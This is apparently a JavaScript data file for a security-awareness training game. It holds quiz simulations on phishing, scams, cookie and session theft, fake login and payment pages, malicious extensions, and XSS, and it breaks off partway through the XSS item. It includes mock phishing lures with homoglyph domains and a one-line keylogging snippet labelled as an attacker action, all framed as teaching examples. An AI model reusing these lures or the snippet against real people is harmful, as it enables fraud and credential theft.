// CyberGuard Academy - Simulation Database
// Safe educational simulations for web security awareness

const simulationsData = [
  {
    id: 1,
    title: "Phishing Attack",
    difficulty: "Beginner",
    time: "3 mins",
    xp: 150,
    icon: "mail",
    goal: "Learn to identify email forgery, suspicious URLs, and avoid credential harvesting links.",
    summary: "Phishing remains the #1 entry point for cyber attacks. Always double-check the sender domain, check for character substitution (homoglyphs), and never enter credentials on pages you reached via email links.",
    tips: [
      "Check the actual sender address, not just the display name.",
      "Hover over links to inspect the destination URL before clicking.",
      "Look for urgent language or threats of account suspension.",
      "Enable multi-factor authentication (MFA) to protect compromised accounts."
    ],
    steps: [
      {
        id: 1,
        title: "Suspicious Email Inbox",
        description: "You received a critical email regarding your account status. Inspect the email carefully before taking action.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="flex items-center justify-between pb-3 border-b border-slate-700 mb-3">
              <div class="flex items-center space-x-2">
                <div class="w-3 h-3 rounded-full bg-red-500"></div>
                <span class="text-xs text-slate-400 font-mono">INBOX: 1 Unread</span>
              </div>
              <span class="text-xs bg-slate-800 px-2 py-1 rounded text-cyan-400">Mock Email Client</span>
            </div>
            
            <div class="bg-slate-800 p-3 rounded-lg border border-slate-700 space-y-2 mb-4">
              <div class="text-sm"><span class="text-slate-400 font-semibold">From:</span> PayPal Support &lt;security@paypaI-updates.com&gt;</div>
              <div class="text-sm"><span class="text-slate-400 font-semibold">Subject:</span> <span class="text-red-400 font-semibold">URGENT: Your account has been suspended!</span></div>
              <div class="text-xs text-slate-500">Received: Just Now</div>
            </div>

            <div class="flex-1 bg-slate-950 p-4 rounded border border-slate-800 text-sm overflow-y-auto space-y-4">
              <p>Dear customer,</p>
              <p>We detected unauthorized login attempts to your account from an unknown IP address. For your security, we have temporarily suspended your account access.</p>
              <p>You must verify your identity within 24 hours, or your funds will be permanently locked.</p>
              <div class="my-4 text-center">
                <a href="#" id="phish-link" class="inline-block bg-cyan-500 text-slate-950 font-bold px-6 py-2 rounded-lg hover:bg-cyan-400 transition cursor-pointer">Verify Account Now</a>
              </div>
              <p class="text-xs text-slate-500">Thanks,<br>PayPal Security Team</p>
            </div>
            
            <div class="flex space-x-2 mt-4">
              <button id="btn-inspect-sender" class="flex-1 bg-slate-800 hover:bg-slate-700 text-xs py-2 rounded border border-slate-700 text-cyan-400 transition">Inspect Sender</button>
              <button id="btn-report-phish" class="flex-1 bg-emerald-950 hover:bg-emerald-900 text-xs py-2 rounded border border-emerald-800 text-emerald-400 transition">Report Phishing</button>
              <button id="btn-delete-email" class="flex-1 bg-rose-950 hover:bg-rose-900 text-xs py-2 rounded border border-rose-800 text-rose-400 transition">Delete Email</button>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2 flex justify-between">
                <span>BEHIND THE SCENES</span>
                <span class="animate-pulse">● ACTIVE SCAN</span>
              </div>
              
              <div class="space-y-3">
                <div class="p-3 bg-slate-900/80 rounded border border-slate-800 flex items-center space-x-3 transition-all duration-300" id="flow-step-1">
                  <div class="w-6 h-6 rounded-full bg-cyan-950 border border-cyan-400 flex items-center justify-center text-cyan-400 font-bold">1</div>
                  <div>
                    <div class="font-bold text-slate-200">Sender Inspection</div>
                    <div class="text-[10px] text-slate-400">Analyzing the sending domain for spoofing signatures.</div>
                  </div>
                </div>

                <div class="flex justify-center text-slate-600"><span class="animate-bounce">↓</span></div>

                <div class="p-3 bg-slate-900/80 rounded border border-slate-800 flex items-center space-x-3 transition-all duration-300" id="flow-step-2">
                  <div class="w-6 h-6 rounded-full bg-slate-950 border border-slate-800 flex items-center justify-center text-slate-500 font-bold">2</div>
                  <div>
                    <div class="font-bold text-slate-400">Link Destination Check</div>
                    <div class="text-[10px] text-slate-500">Checking domain record and looking for Homoglyph substitutes.</div>
                  </div>
                </div>

                <div class="flex justify-center text-slate-600">↓</div>

                <div class="p-3 bg-slate-900/80 rounded border border-slate-800 flex items-center space-x-3 transition-all duration-300" id="flow-step-3">
                  <div class="w-6 h-6 rounded-full bg-slate-950 border border-slate-800 flex items-center justify-center text-slate-500 font-bold">3</div>
                  <div>
                    <div class="font-bold text-slate-400">Credential Harvester</div>
                    <div class="text-[10px] text-slate-500">Malicious site intercepts credentials and stores in database.</div>
                  </div>
                </div>
              </div>
            </div>
            
            <div id="inspector-output" class="bg-slate-950 p-3 rounded border border-slate-800 text-[11px] text-slate-400 leading-relaxed font-mono h-24 overflow-y-auto">
              [SYSTEM]: Click "Inspect Sender" or hover over "Verify Account Now" to examine parameters.
            </div>
          </div>
        `,
        choices: [
          {
            label: "Click 'Verify Account Now' and complete verification",
            correct: false,
            feedback: "Wrong! Notice the sender address: `security@paypaI-updates.com` contains a capital 'I' (eye) instead of a lowercase 'l' (el). This is a Homoglyph spoofing attack. Clicking the link takes you to a hacker's credential harvesting site."
          },
          {
            label: "Inspect sender address details, report phishing, and delete",
            correct: true,
            feedback: "Excellent! Checking the sender reveals it is not PayPal (paypal.com) but a lookalike domain (paypaI-updates.com). Reporting and deleting is the safest action.",
            xpReward: 150
          },
          {
            label: "Reply to the email asking for confirmation of your account status",
            correct: false,
            feedback: "Incorrect. Replying to a phishing email confirms that your email address is active and monitored, which will lead to more targeted spam and cyber attacks."
          }
        ]
      }
    ]
  },
  {
    id: 2,
    title: "Social Media Giveaway Scam",
    difficulty: "Beginner",
    time: "2 mins",
    xp: 100,
    icon: "instagram",
    goal: "Spot trust scams, social engineering vectors, and fake giveaways requesting verification fees.",
    summary: "Scammers create lookalike profiles of celebrities or brands to send messages claiming you won a lottery. They ask for a 'delivery fee' or verification code, which compromises your wallet or account.",
    tips: [
      "Official brands will never ask you to pay a fee to collect a prize.",
      "Check for the verified badge and account history (creation date, post count).",
      "Never share OTPs (One-Time Passwords) or account recovery codes."
    ],
    steps: [
      {
        id: 1,
        title: "Lucky Winner DM",
        description: "You receive a direct message on Instagram from an account that looks like a crypto influencer.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-950 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-900 border border-slate-800 p-3 rounded-t-lg flex items-center space-x-3">
              <div class="w-8 h-8 rounded-full bg-purple-600 flex items-center justify-center font-bold text-xs">EL</div>
              <div class="flex-1">
                <div class="text-sm font-semibold flex items-center">
                  elonmusk_giveaway_official
                  <span class="ml-1 text-slate-400 text-xs">●</span>
                </div>
                <div class="text-[10px] text-slate-400">12.5k Followers (Account created 2 days ago)</div>
              </div>
            </div>
            
            <div class="flex-1 bg-slate-900 border-x border-b border-slate-800 p-3 overflow-y-auto space-y-3">
              <div class="bg-slate-850 p-3 rounded-lg max-w-[85%] text-xs space-y-2">
                <p>Hello lucky winner! 🎁 You have been selected in our random drawing to receive <span class="text-emerald-400 font-bold">0.5 BTC ($30,000 USD)</span>!</p>
                <p>To claim your Bitcoin, click the link below and pay a small wallet verification fee of $15. Once verified, the Bitcoin will be sent instantly.</p>
                <a href="#" id="scam-link" class="text-purple-400 underline block mt-2">verify-btc-giveaway.claims/win</a>
              </div>
            </div>
            
            <div class="flex space-x-2 mt-3">
              <button id="btn-claim" class="flex-1 bg-purple-600 text-xs py-2 rounded text-white font-bold">Claim Prize</button>
              <button id="btn-block" class="flex-1 bg-slate-800 hover:bg-slate-700 text-xs py-2 rounded border border-slate-700 text-slate-300">Block & Report</button>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-purple-400 border-b border-purple-900/50 pb-2">SOCIAL ENGINEERING ANALYSIS</div>
              <div class="space-y-3">
                <div class="p-2 bg-slate-900 rounded border border-slate-800">
                  <div class="text-slate-300 font-bold">Vector: Advance-Fee Scam</div>
                  <p class="text-[10px] text-slate-400 mt-1">Hacker lures user with large sum ($30,000) to hide the risk of the small entry fee ($15).</p>
                </div>
                <div class="p-2 bg-slate-900 rounded border border-slate-800">
                  <div class="text-slate-300 font-bold">Red Flag 1: Account Creation Date</div>
                  <p class="text-[10px] text-slate-400 mt-1">Claiming to be "official" but account created only 2 days ago.</p>
                </div>
                <div class="p-2 bg-slate-900 rounded border border-slate-800">
                  <div class="text-slate-300 font-bold">Red Flag 2: Domain Spoofing</div>
                  <p class="text-[10px] text-slate-400 mt-1">Using '.claims' instead of a verified, official platform domain.</p>
                </div>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Click the link and pay $15 to unlock the $30,000 reward",
            correct: false,
            feedback: "Wrong! This is a classic 'Advance-Fee Scam'. Once you pay the $15, the scammer blocks you and disappears. You will lose the money and potentially compromise your credit card."
          },
          {
            label: "Ignore the link, block the account, and report it to the platform",
            correct: true,
            feedback: "Perfect! Blocking and reporting stops the scammer and helps the platform remove the fake account, protecting other users from falling victim.",
            xpReward: 100
          },
          {
            label: "Send a message back challenging them to prove it is real",
            correct: false,
            feedback: "Incorrect. Scammers are trained to handle objections and might send fake testimonials, certificates, or screenshots to deceive you further. Do not engage."
          }
        ]
      }
    ]
  },
  {
    id: 3,
    title: "Cookie Theft (Session Hijacking)",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 200,
    icon: "cookie",
    goal: "Learn how session tokens are stored, what makes them vulnerable, and how HttpOnly mitigates theft.",
    summary: "Cookies store active login sessions. If a cookie doesn't have the `HttpOnly` flag set, malicious JavaScript can access it via `document.cookie` and send it to an attacker.",
    tips: [
      "Set the `HttpOnly` cookie flag to prevent access via JavaScript.",
      "Set the `Secure` flag to ensure cookies are only transmitted over HTTPS.",
      "Set `SameSite=Strict` or `Lax` to mitigate CSRF attacks."
    ],
    steps: [
      {
        id: 1,
        title: "Vulnerable Session",
        description: "Review a standard login response and see how cookie parameters affect security.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 font-mono text-xs mb-4">
              <div class="text-cyan-400">// Browser HTTP Response Headers</div>
              <div class="mt-2 text-slate-300">HTTP/1.1 200 OK</div>
              <div class="text-slate-300">Content-Type: text/html</div>
              <div class="text-slate-300 bg-amber-950/40 p-1 border border-amber-900/50 rounded mt-1">
                Set-Cookie: session_id=xyz789; Path=/; Domain=shop.com
              </div>
              <div class="text-[10px] text-amber-400 mt-1">⚠️ Warning: Missing 'HttpOnly' and 'Secure' flags!</div>
            </div>

            <div class="flex-1 bg-slate-950 p-3 rounded border border-slate-850 space-y-3">
              <div class="text-sm font-semibold">Active Session Console</div>
              <div class="p-2 bg-slate-900 rounded font-mono text-[11px] text-slate-300">
                <div>&gt; console.log(document.cookie);</div>
                <div class="text-emerald-400">"session_id=xyz789"</div>
              </div>
              <div class="text-xs text-slate-400 bg-slate-900 p-2 rounded">
                Because HttpOnly is missing, JavaScript can read this cookie value. If an attacker injects a script into this page, they can copy this token.
              </div>
            </div>

            <button id="btn-secure-cookie" class="mt-4 w-full bg-emerald-600 hover:bg-emerald-500 font-bold py-2 rounded text-slate-950 text-xs">Secure the Cookie</button>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">COOKIE LEAK SIMULATION</div>
              
              <div class="relative py-4">
                <div class="flex justify-between items-center px-2">
                  <div class="text-center">
                    <div class="w-10 h-10 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center">👤</div>
                    <span class="text-[9px]">Browser</span>
                  </div>
                  
                  <div class="flex-1 px-2 relative h-1 bg-slate-800">
                    <div id="cookie-flow" class="absolute top-[-8px] left-[10%] w-5 h-5 bg-amber-500 rounded-full flex items-center justify-center text-[10px] font-bold text-slate-950 animate-pulse">🍪</div>
                  </div>
                  
                  <div class="text-center">
                    <div class="w-10 h-10 rounded-full bg-red-950 border border-red-500 flex items-center justify-center">😈</div>
                    <span class="text-[9px] text-red-400">Attacker</span>
                  </div>
                </div>
                
                <div class="text-center text-[10px] text-amber-400 mt-4" id="cookie-status">
                  Cookie is readable by JavaScript! Attacker is intercepting.
                </div>
              </div>
            </div>
            
            <div id="cookie-explain" class="bg-slate-950 p-3 rounded border border-slate-800 text-[11px] text-slate-400">
              HttpOnly is a cookie parameter that instructs the browser that the cookie should not be accessible through client-side scripts.
            </div>
          </div>
        `,
        choices: [
          {
            label: "Implement Set-Cookie: session_id=xyz789; Secure; HttpOnly",
            correct: true,
            feedback: "Correct! The 'HttpOnly' flag prevents JavaScript (document.cookie) from accessing the session token, stopping XSS-based cookie theft. 'Secure' ensures the cookie is only sent via HTTPS.",
            xpReward: 200
          },
          {
            label: "Store the session token in LocalStorage instead of cookies",
            correct: false,
            feedback: "Wrong. LocalStorage has NO protection mechanism like HttpOnly. If an XSS vulnerability exists, LocalStorage is even easier for JavaScript to read and steal."
          },
          {
            label: "Encrypt the session cookie with client-side JavaScript",
            correct: false,
            feedback: "Incorrect. If the attacker controls the client-side JavaScript execution (via XSS), they can also access the decryption keys or capture the token before/after encryption."
          }
        ]
      }
    ]
  },
  {
    id: 4,
    title: "Session Hijacking",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 200,
    icon: "shield-alert",
    goal: "Analyze how session tokens are hijacked over unencrypted networks (like open public WiFi) and how to mitigate it.",
    summary: "When you browse websites using HTTP (instead of HTTPS) on a public WiFi network, anyone on that same network can sniff your network traffic and capture your active session tokens.",
    tips: [
      "Ensure the site uses HTTPS (SSL/TLS) for all transactions.",
      "Enforce HTTP Strict Transport Security (HSTS) on servers.",
      "Avoid logging into sensitive accounts on open, untrusted WiFi without a secure VPN."
    ],
    steps: [
      {
        id: 1,
        title: "WiFi Sniffing Vulnerability",
        description: "You are at a local cafe connected to 'Free_Cafe_WiFi'. You log in to a forum that uses HTTP.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200 justify-between">
            <div class="bg-slate-950 p-2 rounded border border-slate-850 flex items-center justify-between text-xs mb-3">
              <span class="text-red-400">⚠️ Connection: Insecure (http://)</span>
              <span class="text-slate-400 font-mono">Free_Cafe_WiFi</span>
            </div>

            <div class="bg-slate-850 p-4 rounded border border-slate-700 space-y-3">
              <div class="text-sm font-semibold">Forum Login Form</div>
              <div>
                <label class="text-[10px] text-slate-400 block mb-1">Username</label>
                <input type="text" class="w-full bg-slate-900 border border-slate-700 text-xs p-2 rounded text-slate-300" value="admin" disabled>
              </div>
              <div>
                <label class="text-[10px] text-slate-400 block mb-1">Password</label>
                <input type="password" class="w-full bg-slate-900 border border-slate-700 text-xs p-2 rounded text-slate-300" value="••••••••" disabled>
              </div>
              <div class="text-[11px] text-amber-400">Request: GET http://my-forum.com/dashboard</div>
            </div>

            <div class="bg-slate-950 p-2 rounded font-mono text-[10px] text-slate-400 mt-3">
              Network Packets are broadcasted over the air unencrypted!
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-red-400 border-b border-red-900/50 pb-2">NETWORK SNIFFER LOG</div>
              
              <div class="bg-slate-950 p-2 rounded border border-slate-850 space-y-1 text-[10px]">
                <div class="text-slate-500">[13:46:12] Sniffing WiFi interface...</div>
                <div class="text-slate-300">[13:46:15] Intercepted Packet from IP 192.168.1.45</div>
                <div class="text-emerald-400">[13:46:15] Header: Cookie: session_token=abc123xyz</div>
                <div class="text-red-400 font-bold animate-pulse">[ALERT] Session Token Harvested!</div>
              </div>
              
              <div class="text-slate-400 text-[10px] leading-relaxed">
                By capturing the cookie <code class="text-cyan-400 bg-slate-900 px-1 py-0.5 rounded">session_token=abc123xyz</code>, the attacker can import this cookie into their own browser and immediately access your account without entering your password.
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Enforce HTTPS with HSTS (HTTP Strict Transport Security)",
            correct: true,
            feedback: "Correct! Enforcing HTTPS encrypts the connection between the client and server. Even if an attacker intercepts the WiFi signals, they only see encrypted gibberish.",
            xpReward: 200
          },
          {
            label: "Implement a stronger password policy",
            correct: false,
            feedback: "Incorrect. Stronger passwords don't help here because the attacker is stealing the resulting *Session Token*, not guessing the password itself."
          },
          {
            label: "Clear browser history after logging out",
            correct: false,
            feedback: "Incorrect. Clearing history does not invalidate the session token that has already been intercepted in transit over the air."
          }
        ]
      }
    ]
  },
  {
    id: 5,
    title: "Fake Login (Phishing Page)",
    difficulty: "Beginner",
    time: "3 mins",
    xp: 120,
    icon: "log-in",
    goal: "Learn how to spot lookalike domains and credential-harvesting login pages.",
    summary: "Attackers copy the exact HTML and CSS of login pages (like Google or Microsoft) and host them on confusing domains. Always look at the address bar before typing.",
    tips: [
      "Check the top-level domain (TLD) and spelling of the site (e.g., `google.com` vs `go0gle.com`).",
      "Look for secure HTTPS indicators, but remember hackers can also obtain free SSL certificates.",
      "Use a password manager; it will refuse to auto-fill details on unauthorized domains."
    ],
    steps: [
      {
        id: 1,
        title: "Domain Verification",
        description: "You clicked a link to log in to your account. Examine the page and address bar.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <!-- Mock Address Bar -->
            <div class="bg-slate-950 p-2 rounded-t border-t border-x border-slate-700 flex items-center space-x-2 text-xs">
              <span class="text-emerald-400">🔒 Secure</span>
              <div class="flex-1 bg-slate-900 px-2 py-1 rounded text-slate-300 font-mono text-[11px] select-all truncate border border-slate-700">
                https://accounts.g00gIe.com/signin/v2/identifier
              </div>
            </div>
            
            <!-- Mock Google Sign In -->
            <div class="flex-1 bg-white text-slate-800 p-6 flex flex-col justify-center items-center rounded-b">
              <div class="w-20 mb-4 flex justify-center">
                <span class="text-2xl font-bold font-serif"><span class="text-blue-500">G</span><span class="text-red-500">o</span><span class="text-yellow-500">o</span><span class="text-blue-500">g</span><span class="text-green-500">l</span><span class="text-red-500">e</span></span>
              </div>
              <h2 class="text-lg font-semibold mb-2">Sign in</h2>
              <p class="text-xs text-slate-500 mb-4">to continue to Gmail</p>
              
              <div class="w-full max-w-xs space-y-3">
                <input type="text" placeholder="Email or phone" class="w-full border border-slate-350 p-2.5 rounded text-sm focus:outline-none focus:border-blue-500" value="user@gmail.com" disabled>
                <input type="password" placeholder="Enter your password" class="w-full border border-slate-350 p-2.5 rounded text-sm focus:outline-none focus:border-blue-500" placeholder="Password">
                <div class="flex justify-between items-center text-xs">
                  <a href="#" class="text-blue-600 font-semibold">Forgot email?</a>
                  <button class="bg-blue-600 hover:bg-blue-700 text-white font-semibold px-6 py-2 rounded text-xs">Next</button>
                </div>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">ADDRESS BAR AUDIT</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 space-y-2">
                <div class="text-red-400 font-bold">Domain Discrepancy Found:</div>
                <div class="font-mono text-xs bg-slate-900 p-1 rounded text-center">
                  g00g<span class="text-yellow-400 font-bold underline">I</span>e.com
                </div>
                <ul class="list-disc pl-4 text-[10px] space-y-1 text-slate-400">
                  <li>Contains <code class="text-amber-400">0</code> (zero) instead of <code class="text-emerald-400">o</code></li>
                  <li>Contains capital <code class="text-amber-400">I</code> (eye) instead of lowercase <code class="text-emerald-400">l</code></li>
                  <li>This is a homoglyph spoofing setup to steal credentials.</li>
                </ul>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Enter password and proceed. The page has a secure lock icon and HTTPS.",
            correct: false,
            feedback: "Wrong! Free SSL certificates can easily be obtained for fake domains. The SSL lock only means traffic is encrypted, not that the recipient is trustworthy."
          },
          {
            label: "Close the page immediately and type the official URL in the browser bar",
            correct: true,
            feedback: "Excellent! Recognizing spelling errors (g00gIe.com) and entering the clean URL manually prevents your password from falling into the wrong hands.",
            xpReward: 120
          },
          {
            label: "Inspect the source code of the page to check its legitimacy",
            correct: false,
            feedback: "Too complex and unnecessary. Simply checking the URL domain suffix and spelling is enough to verify authentication portals."
          }
        ]
      }
    ]
  },
  {
    id: 6,
    title: "Fake Payment Gateway",
    difficulty: "Intermediate",
    time: "3 mins",
    xp: 150,
    icon: "credit-card",
    goal: "Recognize fake, unencrypted, or spoofed payment gateways requesting sensitive security codes.",
    summary: "Attackers embed fake payment forms in hijacked or replica e-commerce sites. These forms often request excessive details, such as credit card PINs or security questions, which are never required for standard transactions.",
    tips: [
      "Legitimate gateways use verified domains (Stripe, PayPal, Adyen).",
      "No real online shop will ever ask for your card's ATM PIN.",
      "Check that your bank sends an 3D Secure OTP verification overlay before completing the transaction."
    ],
    steps: [
      {
        id: 1,
        title: "Checkout Verification",
        description: "You are purchasing a gadget online. Inspect the checkout payment gateway page carefully.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-2 rounded-t border-t border-x border-slate-700 flex items-center justify-between text-xs">
              <span class="text-red-400">🔓 Not Secure (http)</span>
              <span class="font-mono text-[10px] text-slate-400">http://secure-payment-gateway.net/checkout</span>
            </div>
            
            <div class="flex-1 bg-slate-950 p-4 rounded-b border border-slate-800 space-y-3 overflow-y-auto">
              <div class="text-sm font-semibold border-b border-slate-850 pb-2">💳 Payment Information</div>
              <div class="grid grid-cols-2 gap-2">
                <div class="col-span-2">
                  <label class="text-[10px] text-slate-400 block mb-1">Cardholder Name</label>
                  <input type="text" class="w-full bg-slate-900 border border-slate-700 text-xs p-2 rounded text-slate-300" value="John Doe" disabled>
                </div>
                <div class="col-span-2">
                  <label class="text-[10px] text-slate-400 block mb-1">Card Number</label>
                  <input type="text" class="w-full bg-slate-900 border border-slate-700 text-xs p-2 rounded text-slate-300" value="4111 2222 3333 4444" disabled>
                </div>
                <div>
                  <label class="text-[10px] text-slate-400 block mb-1">Expiry Date</label>
                  <input type="text" class="w-full bg-slate-900 border border-slate-700 text-xs p-2 rounded text-slate-300" value="12/29" disabled>
                </div>
                <div>
                  <label class="text-[10px] text-slate-400 block mb-1">CVV / CVV2</label>
                  <input type="text" class="w-full bg-slate-900 border border-slate-700 text-xs p-2 rounded text-slate-300" value="123" disabled>
                </div>
                <div class="col-span-2 bg-red-950/20 border border-red-900/50 p-2 rounded">
                  <label class="text-[10px] text-red-400 block mb-1 font-bold">ATM PIN (Required to confirm security deposit)</label>
                  <input type="password" class="w-full bg-slate-900 border border-red-700 text-xs p-2 rounded text-slate-300 focus:outline-none" placeholder="Enter 4-Digit ATM PIN">
                </div>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">GATEWAY AUDIT</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 space-y-2">
                <div class="text-red-400 font-bold">Critical Indicators:</div>
                <ul class="list-disc pl-4 text-[10px] space-y-1 text-slate-400">
                  <li><code class="text-amber-400">http://</code> protocol. Real payment gateways always enforce strict SSL/TLS.</li>
                  <li>Requesting <code class="text-red-400 font-bold">ATM PIN</code>. No standard online transaction ever requires your debit/credit card ATM PIN.</li>
                  <li>Domain 'secure-payment-gateway.net' is a burner domain.</li>
                </ul>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Enter your ATM PIN to confirm payment and secure your order",
            correct: false,
            feedback: "Wrong! Online merchants NEVER request your ATM PIN. Entering it gives the attacker the ability to clone your card and drain cash from ATMs."
          },
          {
            label: "Cancel transaction, close browser tab, and report the website",
            correct: true,
            feedback: "Correct! The HTTP connection, suspicious domain name, and request for ATM PIN are huge red flags. Canceling and reporting is the right choice.",
            xpReward: 150
          },
          {
            label: "Use a fake ATM PIN to bypass verification and test if it works",
            correct: false,
            feedback: "Incorrect. Submitting any details to a phishing server still registers your card number, CVV, and expiry date, allowing credit card fraud."
          }
        ]
      }
    ]
  },
  {
    id: 7,
    title: "Malicious Browser Extension",
    difficulty: "Intermediate",
    time: "3 mins",
    xp: 140,
    icon: "chrome",
    goal: "Understand extensions permissions risk and how malicious add-ons steal session data.",
    summary: "Browser extensions run inside your page context. If they request permission to read and write all site data, they can spy on form entries, capture passwords, and exfiltrate your session tokens.",
    tips: [
      "Only install extensions from verified developers with high download counts.",
      "Inspect permission dialogs closely: avoid extensions that request more access than they need.",
      "Audit active extensions regularly and disable those you don't use."
    ],
    steps: [
      {
        id: 1,
        title: "Extension Installation Dialog",
        description: "A streaming site prompts you to install an extension to enable HD mode. Look at the requested permissions.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-3 rounded-lg border border-slate-800 space-y-3">
              <div class="flex items-center space-x-3">
                <div class="w-10 h-10 rounded bg-cyan-600 flex items-center justify-center font-bold">HD</div>
                <div>
                  <div class="text-sm font-semibold">VideoHD Stream Accelerator</div>
                  <div class="text-[10px] text-slate-400">Developer: Unverified Third-party</div>
                </div>
              </div>
              
              <div class="p-3 bg-red-950/20 border border-red-900/50 rounded text-xs space-y-2">
                <div class="font-semibold text-red-400">⚠️ Permissions Requested:</div>
                <ul class="list-disc pl-4 space-y-1 text-slate-300 text-[11px]">
                  <li>Read and change all your data on all websites you visit</li>
                  <li>Manage your downloads and access browser history</li>
                </ul>
              </div>
            </div>
            
            <div class="flex-1 flex items-end space-x-2 mt-4">
              <button id="btn-cancel" class="flex-1 bg-slate-800 hover:bg-slate-700 py-2 rounded text-slate-300 text-xs border border-slate-700">Cancel</button>
              <button id="btn-install" class="flex-1 bg-cyan-500 hover:bg-cyan-400 py-2 rounded text-slate-950 font-bold text-xs">Add Extension</button>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">EXTENSION INJECTION MODEL</div>
              
              <div class="bg-slate-950 p-3 rounded border border-slate-850 text-[10px] space-y-2">
                <div class="text-slate-300">Permission: <code class="text-red-400">"all_urls"</code></div>
                <p class="text-slate-400">Allows extension script to run inside every tab, including online banking or social media profiles.</p>
                <div class="text-red-400 font-bold">// Attacker Action:</div>
                <code class="block bg-slate-900 p-1 text-slate-300 text-[9px] truncate">
                  document.addEventListener('input', e => logKey(e.target.value))
                </code>
              </div>
            </div>
          </div>
        `,
        choices: [
          {
            label: "Install the extension to watch the HD stream",
            correct: false,
            feedback: "Wrong! This unverified extension requests full access to read and change all your data, enabling keylogging and session harvesting. Never grant extensive permissions to untrusted addons."
          },
          {
            label: "Deny installation, use alternative platforms, and audit permissions",
            correct: true,
            feedback: "Correct! Protecting your browser environment by denying unnecessary and suspicious permissions is critical to defending against malicious scripts.",
            xpReward: 140
          },
          {
            label: "Install the extension, but disable it when logging in to bank websites",
            correct: false,
            feedback: "Incorrect. It is extremely easy to forget to disable extensions, and automated keyloggers run in the background instantly without your warning."
          }
        ]
      }
    ]
  },
  {
    id: 8,
    title: "XSS Awareness",
    difficulty: "Intermediate",
    time: "4 mins",
    xp: 180,
    icon: "code",
    goal: "Learn how Cross-Site Scripting (XSS) works, and how to sanitise inputs.",
    summary: "XSS occurs when an application accepts user input (like a comment field) and renders it on a page without sanitizing or escaping. This allows attackers to run malicious JavaScript on other users' browsers.",
    tips: [
      "Always sanitize input by encoding HTML characters (e.g., `<` becomes `&lt;`).",
      "Use robust Content Security Policy (CSP) headers to block unauthorized script sources.",
      "Ensure React or framework templates escape variables automatically."
    ],
    steps: [
      {
        id: 1,
        title: "Malicious Comment Input",
        description: "Submit a comment in the blog post interface. Try entering both a normal comment and a script tag.",
        leftWindowHtml: `
          <div class="p-4 bg-slate-900 h-full rounded flex flex-col font-sans text-slate-200">
            <div class="bg-slate-950 p-2 rounded border border-slate-800 text-xs mb-3">
              <span class="text-cyan-400">🌐 Blog Page: Vulnerable Comment Section</span>
            </div>

            <!-- Comment Stream -->
            <div class="flex-1 bg-slate-950 p-3 rounded border border-slate-850 space-y-3 overflow-y-auto" id="comment-stream">
              <div class="p-2 bg-slate-900 rounded text-xs">
                <span class="text-cyan-400 font-bold">Alice:</span> Great article!
              </div>
              <div class="p-2 bg-slate-900 rounded text-xs">
                <span class="text-cyan-400 font-bold">Bob:</span> Very helpful tips.
              </div>
            </div>

            <!-- Input Box -->
            <div class="mt-3 space-y-2">
              <textarea id="comment-input" class="w-full bg-slate-950 border border-slate-700 text-xs p-2 rounded text-slate-350 focus:outline-none focus:border-cyan-500" rows="2" placeholder="Write a comment..."></textarea>
              <div class="flex justify-between items-center">
                <button id="btn-insert-payload" class="text-[10px] bg-slate-800 hover:bg-slate-700 px-2 py-1 rounded text-amber-400 border border-slate-700">Preset XSS Script</button>
                <button id="btn-submit-comment" class="bg-cyan-500 hover:bg-cyan-400 text-slate-950 text-xs font-bold px-4 py-1.5 rounded">Submit Comment</button>
              </div>
            </div>
          </div>
        `,
        rightWindowHtml: `
          <div class="p-4 h-full flex flex-col justify-between font-mono text-xs">
            <div class="space-y-4">
              <div class="text-cyan-400 border-b border-cyan-900/50 pb-2">XSS EXECUTION CHAIN</div>
              
              <div class="space-y-2 text-[10px]" id="xss-chain">
                <div class="p-2 bg-slate-900 rounded border border-slate-800" id="xss-step-1">
                  <div class="text-slate-300">1. Raw Input Saved</div>
                  <p class="text-slate-500">Database stores raw script tags.</p>
                </div>
                <div class="p-2 bg-slate-900 rounded border border-slate-800" id="xss-step-2">
